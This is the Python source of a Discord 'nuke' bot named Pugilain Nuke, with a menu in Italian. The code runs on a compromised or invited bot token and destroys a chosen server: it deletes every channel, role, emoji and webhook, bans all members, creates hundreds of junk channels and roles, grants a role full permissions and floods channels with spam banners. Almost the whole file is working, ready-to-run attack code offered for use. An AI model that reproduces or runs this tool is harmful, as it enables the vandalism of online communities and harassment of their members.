import discord
from discord.ext import commands
import asyncio
import random
import os
import sys
import time
import logging

logging.getLogger('discord.http').setLevel(logging.CRITICAL)
logging.getLogger('discord.gateway').setLevel(logging.CRITICAL)

RED = '\033[91m'
DARK_RED = '\033[31m'
BOLD = '\033[1m'
RESET = '\033[0m'

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

def print_banner():
    clear()
    print(f"""{RED}{BOLD}
             P U G I L A I N   N U K E    
██████╗ ██╗   ██╗ ██████╗ ██╗██╗      █████╗ ██╗███╗   ██╗
██╔══██╗██║   ██║██╔════╝ ██║██║     ██╔══██╗██║████╗  ██║
██████╔╝██║   ██║██║  ███╗██║██║     ███████║██║██╔██╗ ██║
██╔═══╝ ██║   ██║██║   ██║██║██║     ██╔══██║██║██║╚██╗██║
██║     ╚██████╔╝╚██████╔╝██║███████╗██║  ██║██║██║ ╚████║
╚═╝      ╚═════╝  ╚═════╝ ╚═╝╚══════╝╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝
             P U G I L A I N   N U K E
                         v6.0                         
                                                            {RESET}
    """)

def print_menu():
    print(f"""{DARK_RED}{BOLD}
╔════════════════════════════════════════════════════════════════════════════════════════════════════════════╗
║                                                                                                            ║
║   [01] ULTRA NUKE        [19] Kaboom             [37] Purge Msgs        [55] Delete All Roles              ║
║   [02] Ban All           [20] Join Nuke          [38] Show Bans         [56] Ban All                       ║
║   [03] Delete Channels   [21] Delete Categories  [39] Show Categories   [57] DELETE ALL                    ║
║   [04] Delete Roles      [22] Delete Voice       [40] Show Emoji        [58] REFRESH                       ║
║   [05] Channel Bomb      [23] Spam Webhooks      [41] Show Voice                                           ║
║   [06] Role Bomb         [24] Grant Perms        [42] Bot Config                                           ║
║   [07] Spam All          [25] Check Perms        [43] Create Category                                      ║
║   [08] Change Name       [26] Move Role          [44] Create VC                                            ║
║   [09] Change Icon       [27] Ban Member         [45] Create Channel                                       ║
║   [10] Create Role       [28] Unban              [46] Delete All CC                                        ║
║   [11] Mass Nickname     [29] Add Role           [47] Role To                                              ║
║   [12] Delete Emojis     [30] Del Chan           [48] Move Role                                            ║
║   [13] Delete Webhooks   [31] Del Role           [49] Auto Nick                                            ║
║   [14] Leave Server      [32] Del Cat            [50] Auto Status                                          ║
║   [15] Server Info       [33] Del Emoji          [51] Change Status                                        ║
║   [16] Show Channels     [34] Add Emoji          [52] Link                                                 ║
║   [17] Show Roles        [35] Bot Status         [53] Check Role Perms                                     ║
║   [18] Show Members      [36] Disable CM         [54] Grant All Perm                                       ║
║                                                                                                            ║
╠════════════════════════════════════════════════════════════════════════════════════════════════════════════╣
║                                      [ 0 ]  EXIT     •     [ ? ]  HELP                                     ║
╚════════════════════════════════════════════════════════════════════════════════════════════════════════════╝{RESET}
    """)

bot = commands.Bot(command_prefix='!', intents=discord.Intents.all(), help_command=None)
bot.target_guild = None
bot.nuke_active = False

@bot.event
async def on_ready():
    print_banner()
    print(f"""{RED}{BOLD}
╔══════════════════════════════════════════════════════════════╗
║                    BOT ONLINE                                 ║
╠══════════════════════════════════════════════════════════════╣
║  Bot Name: {bot.user.name:<50}║
║  Bot ID: {bot.user.id:<52}║
║  Servers: {len(bot.guilds):<51}║
╚══════════════════════════════════════════════════════════════╝{RESET}
    """)
    await select_server()

async def select_server():
    if len(bot.guilds) > 0:
        print(f"""{RED}{BOLD}
╔══════════════════════════════════════════════════════════════╗
║                    SELECT SERVER                             ║
╠══════════════════════════════════════════════════════════════╣""")
        for i, guild in enumerate(bot.guilds):
            print(f"""║  [{i+1}] {guild.name:<55}║""")
        print(f"""╚══════════════════════════════════════════════════════════════╝{RESET}""")
        
        try:
            choice = int(input("\n[?] Seleziona server numero: "))
            if 1 <= choice <= len(bot.guilds):
                bot.target_guild = bot.guilds[choice-1]
                print(f"\n[✓] Target: {bot.target_guild.name}")
                await asyncio.sleep(0.5)
                await show_menu()
        except:
            print("[!] Selezione invalida")

async def show_menu():
    while True:
        print_banner()
        print_menu()
        try:
            choice = input("[?] Seleziona opzione: ")
            
            if choice == "1":
                await ultra_nuke()
            elif choice == "2":
                await ban_all()
            elif choice == "3":
                await delete_channels()
            elif choice == "4":
                await delete_roles()
            elif choice == "5":
                amount = int(input("[?] Quantità canali: "))
                await channel_bomb(amount)
            elif choice == "6":
                amount = int(input("[?] Quantità ruoli: "))
                await role_bomb(amount)
            elif choice == "7":
                await spam_all()
            elif choice == "8":
                name = input("[?] Nuovo nome server: ")
                await change_server_name(name)
            elif choice == "9":
                await change_server_icon()
            elif choice == "10":
                await create_pugilain_role()
            elif choice == "11":
                nick = input("[?] Nickname (invio per default): ")
                await mass_nickname(nick)
            elif choice == "12":
                await delete_emojis()
            elif choice == "13":
                await delete_webhooks()
            elif choice == "14":
                await leave_server()
                break
            elif choice == "15":
                await show_server_info()
            elif choice == "16":
                await show_channels()
            elif choice == "17":
                await show_roles()
            elif choice == "18":
                await show_members()
            elif choice == "19":
                await kaboom()
            elif choice == "20":
                await join_nuke()
            elif choice == "21":
                await delete_categories()
            elif choice == "22":
                await delete_voice_channels()
            elif choice == "23":
                await spam_webhooks()
            elif choice == "24":
                await grant_all_perms()
            elif choice == "25":
                await check_role_perms()
            elif choice == "26":
                await move_role()
            elif choice == "27":
                member_id = input("[?] ID membro: ")
                await ban_member(member_id)
            elif choice == "28":
                user_id = input("[?] ID utente: ")
                await unban_member(user_id)
            elif choice == "29":
                member_id = input("[?] ID membro: ")
                role_id = input("[?] ID ruolo: ")
                await add_role_to_member(member_id, role_id)
            elif choice == "30":
                channel_id = input("[?] ID canale: ")
                await delete_channel(channel_id)
            elif choice == "31":
                role_id = input("[?] ID ruolo: ")
                await delete_role(role_id)
            elif choice == "32":
                category_id = input("[?] ID categoria: ")
                await delete_category(category_id)
            elif choice == "33":
                emoji_id = input("[?] ID emoji: ")
                await delete_emoji(emoji_id)
            elif choice == "34":
                await add_emoji()
            elif choice == "35":
                await bot_status()
            elif choice == "36":
                await disable_community_mode()
            elif choice == "37":
                amount = int(input("[?] Quantità messaggi: "))
                await purge_messages(amount)
            elif choice == "38":
                await show_bans()
            elif choice == "39":
                await show_categories()
            elif choice == "40":
                await show_emojis()
            elif choice == "41":
                await show_voice_channels()
            elif choice == "42":
                await show_bot_config()
            elif choice == "43":
                name = input("[?] Nome categoria: ")
                await create_category(name)
            elif choice == "44":
                name = input("[?] Nome canale vocale: ")
                await create_voice_channel(name)
            elif choice == "45":
                name = input("[?] Nome canale: ")
                await create_text_channel(name)
            elif choice == "46":
                await delete_all_cc()
            elif choice == "47":
                member_id = input("[?] ID membro: ")
                role_id = input("[?] ID ruolo: ")
                await role_to(member_id, role_id)
            elif choice == "48":
                role_id = input("[?] ID ruolo: ")
                position = input("[?] Posizione: ")
                await move_role_position(role_id, position)
            elif choice == "49":
                nick = input("[?] Nickname: ")
                await auto_nick(nick)
            elif choice == "50":
                status = input("[?] Status (online/idle/dnd/offline): ")
                await auto_status(status)
            elif choice == "51":
                status = input("[?] Status testo: ")
                await change_status(status)
            elif choice == "52":
                await show_link()
            elif choice == "53":
                role_id = input("[?] ID ruolo: ")
                await check_role_permissions(role_id)
            elif choice == "54":
                role_id = input("[?] ID ruolo: ")
                await grant_all_permissions(role_id)
            elif choice == "55":
                await delete_all_roles()
            elif choice == "56":
                await ban_all_members()
            elif choice == "57":
                await delete_all()
            elif choice == "58":
                await refresh()
            elif choice == "0":
                print("\n[!] Chiusura...")
                await bot.close()
                sys.exit(0)
            else:
                print("[!] Opzione invalida")
                await asyncio.sleep(0.5)
        except Exception as e:
            print(f"[!] Errore: {e}")
            await asyncio.sleep(0.5)

async def refresh():
    print("\n[✓] Refresh completato!")

async def delete_all():
    if bot.target_guild:
        print("\n[!] DELETE ALL - Eliminazione totale...")
        
        tasks = []
        for role in bot.target_guild.roles:
            if role.name != "@everyone":
                tasks.append(role.delete())
        for channel in bot.target_guild.channels:
            tasks.append(channel.delete())
        for emoji in bot.target_guild.emojis:
            tasks.append(emoji.delete())
        
        for i in range(0, len(tasks), 50):
            batch = tasks[i:i+50]
            try:
                await asyncio.gather(*batch, return_exceptions=True)
            except:
                pass
        
        print("[✓] DELETE ALL completato!")

async def ultra_nuke():
    if bot.target_guild:
        print("\n[!] ULTRA NUKE IN CORSO...")
        
        tasks = []
        for role in bot.target_guild.roles:
            if role.name != "@everyone":
                tasks.append(role.delete())
        for channel in bot.target_guild.channels:
            tasks.append(channel.delete())
        
        for i in range(0, len(tasks), 50):
            batch = tasks[i:i+50]
            try:
                await asyncio.gather(*batch, return_exceptions=True)
            except:
                pass
        
        names = ["pugilain-nuked", "destroyed", "anti-pedos", "rekt", "nuked", "pugilain", "dark", "owned"]
        tasks = []
        for i in range(400):
            name = f"{random.choice(names)}-{i}"
            tasks.append(bot.target_guild.create_text_channel(name))
        
        for i in range(0, len(tasks), 50):
            batch = tasks[i:i+50]
            try:
                await asyncio.gather(*batch, return_exceptions=True)
            except:
                pass
        
        role_names = ["PUGILAIN", "DARK", "NUKED", "DESTROYED", "ANTI-PEDOS", "PUGILAIN TEAM"]
        tasks = []
        for i in range(100):
            name = f"{random.choice(role_names)}-{i}"
            tasks.append(bot.target_guild.create_role(name=name))
        
        for i in range(0, len(tasks), 50):
            batch = tasks[i:i+50]
            try:
                await asyncio.gather(*batch, return_exceptions=True)
            except:
                pass
        
        emojis = ["⛧", "☠︎", "⛓", "₣Ʉ₵₭", "⚡", "🔥", "💀", "🖤", "⛓️", "🔪", "🩸", "☠️"]
        texts = [
            "PUGILAIN TEAM NUKE",
            "₣Ʉ₵₭ ₱ɆĐØ₴",
            "CHILDREN ARE NOT TARGETS",
            "PROTECT. REPORT. NEVER IGNORE.",
            "ANTI-PEDOS",
            "PUGILAIN DARK MEMBERS",
            "⛧ PUGILAIN ⛧",
            "DESTROYED BY PUGILAIN",
            "PUGILAIN ON TOP",
            "GET REKT"
        ]
        
        for _ in range(100):
            tasks = []
            for channel in bot.target_guild.text_channels[:50]:
                emoji_line = " ".join(random.choice(emojis) for _ in range(20))
                text = random.choice(texts)
                message = f"{emoji_line}\n{text}\n{emoji_line}"
                tasks.append(channel.send(message))
            
            try:
                await asyncio.gather(*tasks, return_exceptions=True)
            except:
                pass
        
        print("[✓] ULTRA NUKE COMPLETATO!")

async def spam_all():
    if bot.target_guild:
        emojis = ["⛧", "☠︎", "⛓", "₣Ʉ₵₭", "⚡", "🔥", "💀", "🖤", "⛓️", "🔪", "🩸", "☠️"]
        texts = [
            "PUGILAIN TEAM NUKE",
            "₣Ʉ₵₭ ₱ɆĐØ₴",
            "CHILDREN ARE NOT TARGETS",
            "PROTECT. REPORT. NEVER IGNORE.",
            "ANTI-PEDOS",
            "PUGILAIN DARK MEMBERS",
            "⛧ PUGILAIN ⛧",
            "DESTROYED BY PUGILAIN",
            "PUGILAIN ON TOP",
            "GET REKT"
        ]
        
        print("\n[!] SPAMMING...")
        
        for _ in range(100):
            tasks = []
            for channel in bot.target_guild.text_channels[:50]:
                emoji_line = " ".join(random.choice(emojis) for _ in range(15))
                text = random.choice(texts)
                message = f"{emoji_line}\n{text}\n{emoji_line}"
                tasks.append(channel.send(message))
            
            try:
                await asyncio.gather(*tasks, return_exceptions=True)
            except:
                pass
        
        print("[✓] SPAM COMPLETATO!")

async def kaboom():
    if bot.target_guild:
        print("\n[!] KABOOM! Nuke massivo...")
        
        tasks = []
        for role in bot.target_guild.roles:
            if role.name != "@everyone":
                tasks.append(role.delete())
        for channel in bot.target_guild.channels:
            tasks.append(channel.delete())
        
        for i in range(0, len(tasks), 50):
            batch = tasks[i:i+50]
            try:
                await asyncio.gather(*batch, return_exceptions=True)
            except:
                pass
        
        tasks = []
        for i in range(50):
            tasks.append(bot.target_guild.create_text_channel(f"kaboom-{i}"))
        
        for i in range(0, len(tasks), 50):
            batch = tasks[i:i+50]
            try:
                await asyncio.gather(*batch, return_exceptions=True)
            except:
                pass
        
        emojis = ["⛧", "☠︎", "⛓", "₣Ʉ₵₭", "⚡", "🔥", "💀", "🖤"]
        
        for _ in range(50):
            tasks = []
            for channel in bot.target_guild.text_channels[:50]:
                emoji_line = " ".join(random.choice(emojis) for _ in range(10))
                message = f"{emoji_line}\nPUGILAIN TEAM NUKE\n{emoji_line}"
                tasks.append(channel.send(message))
            
            try:
                await asyncio.gather(*tasks, return_exceptions=True)
            except:
                pass
        
        print("[✓] KABOOM completato")

async def ban_all():
    if bot.target_guild:
        print("\n[!] Banning all members...")
        tasks = []
        for member in bot.target_guild.members:
            if member != bot.user:
                tasks.append(member.ban())
        
        for i in range(0, len(tasks), 50):
            batch = tasks[i:i+50]
            try:
                await asyncio.gather(*batch, return_exceptions=True)
            except:
                pass
        print("[✓] Tutti bannati")

async def delete_channels():
    if bot.target_guild:
        print("\n[!] Eliminazione canali...")
        tasks = [channel.delete() for channel in bot.target_guild.channels]
        for i in range(0, len(tasks), 50):
            batch = tasks[i:i+50]
            try:
                await asyncio.gather(*batch, return_exceptions=True)
            except:
                pass
        print("[✓] Canali eliminati")

async def delete_roles():
    if bot.target_guild:
        print("\n[!] Eliminazione ruoli...")
        tasks = []
        for role in bot.target_guild.roles:
            if role.name != "@everyone":
                tasks.append(role.delete())
        for i in range(0, len(tasks), 50):
            batch = tasks[i:i+50]
            try:
                await asyncio.gather(*batch, return_exceptions=True)
            except:
                pass
        print("[✓] Ruoli eliminati")

async def channel_bomb(amount):
    if bot.target_guild:
        print(f"\n[!] Creazione {amount} canali...")
        tasks = []
        for i in range(amount):
            tasks.append(bot.target_guild.create_text_channel(f"pugilain-{i}"))
        
        for i in range(0, len(tasks), 50):
            batch = tasks[i:i+50]
            try:
                await asyncio.gather(*batch, return_exceptions=True)
            except:
                pass
        print("[✓] Channel bomb completato")

async def role_bomb(amount):
    if bot.target_guild:
        print(f"\n[!] Creazione {amount} ruoli...")
        tasks = []
        for i in range(amount):
            tasks.append(bot.target_guild.create_role(name=f"PUGILAIN-{i}"))
        
        for i in range(0, len(tasks), 50):
            batch = tasks[i:i+50]
            try:
                await asyncio.gather(*batch, return_exceptions=True)
            except:
                pass
        print("[✓] Role bomb completato")

async def change_server_name(name):
    if bot.target_guild and name:
        await bot.target_guild.edit(name=name)
        print(f"[✓] Nome cambiato in: {name}")

async def change_server_icon():
    if bot.target_guild:
        icon_path = input("[?] Percorso immagine icona: ")
        if os.path.exists(icon_path):
            with open(icon_path, 'rb') as f:
                icon_data = f.read()
            await bot.target_guild.edit(icon=icon_data)
            print("[✓] Icona cambiata")

async def create_pugilain_role():
    if bot.target_guild:
        role = await bot.target_guild.create_role(name="PUGILAIN DARK MEMBERS")
        print(f"[✓] Ruolo creato: {role.name}")

async def mass_nickname(nick):
    if bot.target_guild:
        print("\n[!] Cambio nickname...")
        tasks = []
        for member in bot.target_guild.members:
            if nick:
                tasks.append(member.edit(nick=nick))
            else:
                tasks.append(member.edit(nick="PUGILAIN DARK"))
        
        for i in range(0, len(tasks), 50):
            batch = tasks[i:i+50]
            try:
                await asyncio.gather(*batch, return_exceptions=True)
            except:
                pass
        print("[✓] Nickname cambiati")

async def delete_emojis():
    if bot.target_guild:
        print("\n[!] Eliminazione emoji...")
        tasks = [emoji.delete() for emoji in bot.target_guild.emojis]
        for i in range(0, len(tasks), 50):
            batch = tasks[i:i+50]
            try:
                await asyncio.gather(*batch, return_exceptions=True)
            except:
                pass
        print("[✓] Emoji eliminate")

async def delete_webhooks():
    if bot.target_guild:
        print("\n[!] Eliminazione webhooks...")
        for channel in bot.target_guild.text_channels:
            try:
                webhooks = await channel.webhooks()
                tasks = [webhook.delete() for webhook in webhooks]
                await asyncio.gather(*tasks, return_exceptions=True)
            except:
                pass
        print("[✓] Webhooks eliminati")

async def leave_server():
    if bot.target_guild:
        print(f"\n[!] Uscendo da {bot.target_guild.name}...")
        await bot.target_guild.leave()
        print("[✓] Uscito dal server")

async def show_server_info():
    if bot.target_guild:
        print(f"""
╔══════════════════════════════════════════════════════════════╗
║                    SERVER INFO                                ║
╠══════════════════════════════════════════════════════════════╣
║  Nome: {bot.target_guild.name:<54}║
║  ID: {bot.target_guild.id:<56}║
║  Owner: {bot.target_guild.owner:<52}║
║  Membri: {len(bot.target_guild.members):<51}║
║  Canali: {len(bot.target_guild.channels):<51}║
║  Ruoli: {len(bot.target_guild.roles):<52}║
║  Emoji: {len(bot.target_guild.emojis):<52}║
║  Creato: {bot.target_guild.created_at.strftime('%Y-%m-%d'):<51}║
╚══════════════════════════════════════════════════════════════╝
        """)
        input("\n[?] Premi invio per continuare...")

async def show_channels():
    if bot.target_guild:
        print("\n╔══════════════════════════════════════════════════════════════╗")
        print("║                    CANALI                                    ║")
        print("╠══════════════════════════════════════════════════════════════╣")
        for c in bot.target_guild.channels:
            print(f"║  {c.name:<58}║")
        print("╚══════════════════════════════════════════════════════════════╝")
        input("\n[?] Premi invio per continuare...")

async def show_roles():
    if bot.target_guild:
        print("\n╔══════════════════════════════════════════════════════════════╗")
        print("║                    RUOLI                                     ║")
        print("╠══════════════════════════════════════════════════════════════╣")
        for r in bot.target_guild.roles:
            print(f"║  {r.name:<58}║")
        print("╚══════════════════════════════════════════════════════════════╝")
        input("\n[?] Premi invio per continuare...")

async def show_members():
    if bot.target_guild:
        print("\n╔══════════════════════════════════════════════════════════════╗")
        print("║                    MEMBRI                                    ║")
        print("╠══════════════════════════════════════════════════════════════╣")
        for m in bot.target_guild.members:
            print(f"║  {m.name}#{m.discriminator:<54}║")
        print("╚══════════════════════════════════════════════════════════════╝")
        input("\n[?] Premi invio per continuare...")

async def join_nuke():
    if bot.target_guild:
        print("\n[!] Join Nuke...")
        
        tasks = [channel.delete() for channel in bot.target_guild.channels]
        for i in range(0, len(tasks), 50):
            batch = tasks[i:i+50]
            try:
                await asyncio.gather(*batch, return_exceptions=True)
            except:
                pass
        
        tasks = []
        for i in range(50):
            tasks.append(bot.target_guild.create_text_channel(f"joined-nuke-{i}"))
        
        for i in range(0, len(tasks), 50):
            batch = tasks[i:i+50]
            try:
                await asyncio.gather(*batch, return_exceptions=True)
            except:
                pass
        
        emojis = ["⛧", "☠︎", "⛓", "₣Ʉ₵₭", "⚡", "🔥", "💀", "🖤"]
        
        for _ in range(50):
            tasks = []
            for channel in bot.target_guild.text_channels[:50]:
                emoji_line = " ".join(random.choice(emojis) for _ in range(10))
                message = f"{emoji_line}\nPUGILAIN TEAM NUKE\n{emoji_line}"
                tasks.append(channel.send(message))
            
            try:
                await asyncio.gather(*tasks, return_exceptions=True)
            except:
                pass
        
        print("[✓] Join Nuke completato")

async def delete_categories():
    if bot.target_guild:
        print("\n[!] Eliminazione categorie...")
        tasks = [category.delete() for category in bot.target_guild.categories]
        for i in range(0, len(tasks), 50):
            batch = tasks[i:i+50]
            try:
                await asyncio.gather(*batch, return_exceptions=True)
            except:
                pass
        print("[✓] Categorie eliminate")

async def delete_voice_channels():
    if bot.target_guild:
        print("\n[!] Eliminazione canali vocali...")
        tasks = [channel.delete() for channel in bot.target_guild.voice_channels]
        for i in range(0, len(tasks), 50):
            batch = tasks[i:i+50]
            try:
                await asyncio.gather(*batch, return_exceptions=True)
            except:
                pass
        print("[✓] Canali vocali eliminati")

async def spam_webhooks():
    if bot.target_guild:
        print("\n[!] Creazione webhooks...")
        for channel in bot.target_guild.text_channels[:20]:
            try:
                webhook = await channel.create_webhook(name="PUGILAIN")
                await webhook.send("PUGILAIN TEAM NUKE")
            except:
                pass
        print("[✓] Webhooks spammati")

async def grant_all_perms():
    if bot.target_guild:
        role_id = input("[?] ID ruolo: ")
        role = bot.target_guild.get_role(int(role_id))
        if role:
            perms = discord.Permissions.all()
            await role.edit(permissions=perms)
            print(f"[✓] Permessi massimi concessi a: {role.name}")

async def check_role_perms():
    if bot.target_guild:
        role_id = input("[?] ID ruolo: ")
        role = bot.target_guild.get_role(int(role_id))
        if role:
            perms = role.permissions
            dangerous = []
            if perms.administrator:
                dangerous.append("Administrator")
            if perms.manage_guild:
                dangerous.append("Manage Guild")
            if perms.ban_members:
                dangerous.append("Ban Members")
            if perms.kick_members:
                dangerous.append("Kick Members")
            if perms.manage_channels:
                dangerous.append("Manage Channels")
            if perms.manage_roles:
                dangerous.append("Manage Roles")
            if perms.manage_webhooks:
                dangerous.append("Manage Webhooks")
            if perms.mention_everyone:
                dangerous.append("Mention Everyone")
            
            if dangerous:
                print(f"\n[!] Permessi pericolosi di {role.name}:")
                for perm in dangerous:
                    print(f"  - {perm}")
            else:
                print(f"[✓] {role.name} non ha permessi pericolosi")
            input("\n[?] Premi invio per continuare...")

async def move_role():
    if bot.target_guild:
        role_id = input("[?] ID ruolo: ")
        position = int(input("[?] Nuova posizione: "))
        role = bot.target_guild.get_role(int(role_id))
        if role:
            await role.edit(position=position)
            print(f"[✓] Ruolo {role.name} spostato")

async def ban_member(member_id):
    if bot.target_guild:
        member = bot.target_guild.get_member(int(member_id))
        if member:
            await member.ban()
            print(f"[✓] Bannato: {member.name}")

async def unban_member(user_id):
    if bot.target_guild:
        user = await bot.fetch_user(int(user_id))
        await bot.target_guild.unban(user)
        print(f"[✓] Sbannato: {user.name}")

async def add_role_to_member(member_id, role_id):
    if bot.target_guild:
        member = bot.target_guild.get_member(int(member_id))
        role = bot.target_guild.get_role(int(role_id))
        if member and role:
            await member.add_roles(role)
            print(f"[✓] Ruolo {role.name} aggiunto a {member.name}")

async def delete_channel(channel_id):
    if bot.target_guild:
        channel = bot.target_guild.get_channel(int(channel_id))
        if channel:
            await channel.delete()
            print(f"[✓] Canale eliminato: {channel.name}")

async def delete_role(role_id):
    if bot.target_guild:
        role = bot.target_guild.get_role(int(role_id))
        if role:
            await role.delete()
            print(f"[✓] Ruolo eliminato: {role.name}")

async def delete_category(category_id):
    if bot.target_guild:
        category = bot.target_guild.get_channel(int(category_id))
        if category and isinstance(category, discord.CategoryChannel):
            await category.delete()
            print(f"[✓] Categoria eliminata: {category.name}")

async def delete_emoji(emoji_id):
    if bot.target_guild:
        emoji = bot.target_guild.get_emoji(int(emoji_id))
        if emoji:
            await emoji.delete()
            print(f"[✓] Emoji eliminata: {emoji.name}")

async def add_emoji():
    if bot.target_guild:
        print("[!] Incolla URL immagine emoji:")
        url = input("[?] URL: ")
        name = input("[?] Nome emoji: ")
        try:
            import aiohttp
            async with aiohttp.ClientSession() as session:
                async with session.get(url) as resp:
                    if resp.status == 200:
                        image_data = await resp.read()
                        emoji = await bot.target_guild.create_custom_emoji(name=name, image=image_data)
                        print(f"[✓] Emoji creata: {emoji.name}")
        except:
            print("[!] Errore creazione emoji")

async def bot_status():
    status = input("[?] Status (online/idle/dnd/offline): ")
    if status == "online":
        await bot.change_presence(status=discord.Status.online)
    elif status == "idle":
        await bot.change_presence(status=discord.Status.idle)
    elif status == "dnd":
        await bot.change_presence(status=discord.Status.dnd)
    elif status == "offline":
        await bot.change_presence(status=discord.Status.offline)
    print("[✓] Status cambiato")

async def disable_community_mode():
    if bot.target_guild:
        try:
            await bot.target_guild.edit(community=False)
            print("[✓] Community mode disabilitato")
        except:
            print("[!] Impossibile disabilitare")

async def purge_messages(amount):
    if bot.target_guild:
        channel_id = input("[?] ID canale (invio per canale corrente): ")
        if channel_id:
            channel = bot.target_guild.get_channel(int(channel_id))
        else:
            channel = bot.target_guild.text_channels[0] if bot.target_guild.text_channels else None
        
        if channel and isinstance(channel, discord.TextChannel):
            deleted = await channel.purge(limit=amount)
            print(f"[✓] {len(deleted)} messaggi eliminati")

async def show_bans():
    if bot.target_guild:
        print("\n[!] Lista bannati:")
        async for entry in bot.target_guild.bans():
            print(f"  - {entry.user.name} (ID: {entry.user.id})")
        input("\n[?] Premi invio per continuare...")

async def show_categories():
    if bot.target_guild:
        print("\n╔══════════════════════════════════════════════════════════════╗")
        print("║                    CATEGORIE                                 ║")
        print("╠══════════════════════════════════════════════════════════════╣")
        for c in bot.target_guild.categories:
            print(f"║  {c.name:<58}║")
        print("╚══════════════════════════════════════════════════════════════╝")
        input("\n[?] Premi invio per continuare...")

async def show_emojis():
    if bot.target_guild:
        print("\n╔══════════════════════════════════════════════════════════════╗")
        print("║                    EMOJI                                     ║")
        print("╠══════════════════════════════════════════════════════════════╣")
        for e in bot.target_guild.emojis:
            print(f"║  {e.name} (ID: {e.id})<46║")
        print("╚══════════════════════════════════════════════════════════════╝")
        input("\n[?] Premi invio per continuare...")

async def show_voice_channels():
    if bot.target_guild:
        print("\n╔══════════════════════════════════════════════════════════════╗")
        print("║                    CANALI VOCALI                             ║")
        print("╠══════════════════════════════════════════════════════════════╣")
        for c in bot.target_guild.voice_channels:
            print(f"║  {c.name:<58}║")
        print("╚══════════════════════════════════════════════════════════════╝")
        input("\n[?] Premi invio per continuare...")

async def show_bot_config():
    if bot.target_guild:
        print(f"""
╔══════════════════════════════════════════════════════════════╗
║                    BOT CONFIG                                 ║
╠══════════════════════════════════════════════════════════════╣
║  Bot: {bot.user.name:<55}║
║  ID: {bot.user.id:<56}║
║  Target: {bot.target_guild.name:<51}║
║  Comandi: {len(bot.commands):<50}║
╚══════════════════════════════════════════════════════════════╝
        """)
        input("\n[?] Premi invio per continuare...")

async def create_category(name):
    if bot.target_guild and name:
        category = await bot.target_guild.create_category(name)
        print(f"[✓] Categoria creata: {category.name}")

async def create_voice_channel(name):
    if bot.target_guild and name:
        channel = await bot.target_guild.create_voice_channel(name)
        print(f"[✓] Canale vocale creato: {channel.name}")

async def create_text_channel(name):
    if bot.target_guild and name:
        channel = await bot.target_guild.create_text_channel(name)
        print(f"[✓] Canale creato: {channel.name}")

async def delete_all_cc():
    if bot.target_guild:
        print("\n[!] Eliminazione canali e categorie...")
        tasks = [channel.delete() for channel in bot.target_guild.channels]
        for i in range(0, len(tasks), 50):
            batch = tasks[i:i+50]
            try:
                await asyncio.gather(*batch, return_exceptions=True)
            except:
                pass
        print("[✓] Eliminati")

async def role_to(member_id, role_id):
    if bot.target_guild:
        member = bot.target_guild.get_member(int(member_id))
        role = bot.target_guild.get_role(int(role_id))
        if member and role:
            await member.add_roles(role)
            print(f"[✓] Ruolo aggiunto")

async def move_role_position(role_id, position):
    if bot.target_guild:
        role = bot.target_guild.get_role(int(role_id))
        if role:
            await role.edit(position=int(position))
            print(f"[✓] Ruolo spostato")

async def auto_nick(nick):
    if bot.target_guild:
        print("\n[!] Cambio nickname automatico...")
        tasks = []
        for member in bot.target_guild.members:
            tasks.append(member.edit(nick=nick))
        for i in range(0, len(tasks), 50):
            batch = tasks[i:i+50]
            try:
                await asyncio.gather(*batch, return_exceptions=True)
            except:
                pass
        print("[✓] Completato")

async def auto_status(status):
    if status == "online":
        await bot.change_presence(status=discord.Status.online)
    elif status == "idle":
        await bot.change_presence(status=discord.Status.idle)
    elif status == "dnd":
        await bot.change_presence(status=discord.Status.dnd)
    elif status == "offline":
        await bot.change_presence(status=discord.Status.offline)
    print("[✓] Status cambiato")

async def change_status(status):
    await bot.change_presence(activity=discord.Game(name=status))
    print(f"[✓] Status: {status}")

async def show_link():
    print("\n[✓] Link: https://discord.gg/pugilain")
    input("\n[?] Premi invio per continuare...")

async def check_role_permissions(role_id):
    if bot.target_guild:
        role = bot.target_guild.get_role(int(role_id))
        if role:
            perms = role.permissions
            dangerous = []
            if perms.administrator:
                dangerous.append("Administrator")
            if perms.manage_guild:
                dangerous.append("Manage Guild")
            if perms.ban_members:
                dangerous.append("Ban Members")
            if perms.kick_members:
                dangerous.append("Kick Members")
            if perms.manage_channels:
                dangerous.append("Manage Channels")
            if perms.manage_roles:
                dangerous.append("Manage Roles")
            if perms.manage_webhooks:
                dangerous.append("Manage Webhooks")
            if perms.mention_everyone:
                dangerous.append("Mention Everyone")
            
            if dangerous:
                print(f"\n[!] Permessi pericolosi di {role.name}:")
                for perm in dangerous:
                    print(f"  - {perm}")
            else:
                print(f"[✓] {role.name} non ha permessi pericolosi")
            input("\n[?] Premi invio per continuare...")

async def grant_all_permissions(role_id):
    if bot.target_guild:
        role = bot.target_guild.get_role(int(role_id))
        if role:
            perms = discord.Permissions.all()
            await role.edit(permissions=perms)
            print(f"[✓] Permessi massimi concessi")

async def delete_all_roles():
    if bot.target_guild:
        print("\n[!] Eliminazione tutti i ruoli...")
        tasks = []
        for role in bot.target_guild.roles:
            if role.name != "@everyone":
                tasks.append(role.delete())
        for i in range(0, len(tasks), 50):
            batch = tasks[i:i+50]
            try:
                await asyncio.gather(*batch, return_exceptions=True)
            except:
                pass
        print("[✓] Ruoli eliminati")

async def ban_all_members():
    if bot.target_guild:
        print("\n[!] Banning tutti i membri...")
        tasks = []
        for member in bot.target_guild.members:
            if member != bot.user:
                tasks.append(member.ban())
        for i in range(0, len(tasks), 50):
            batch = tasks[i:i+50]
            try:
                await asyncio.gather(*batch, return_exceptions=True)
            except:
                pass
        print("[✓] Tutti bannati")

if __name__ == "__main__":
    print_banner()
    token = input("[?] Inserisci il token del bot: ")
    try:
        bot.run(token)
    except Exception as e:
        print(f"[!] Errore: {e}")
        input("\n[?] Premi invio per uscire...")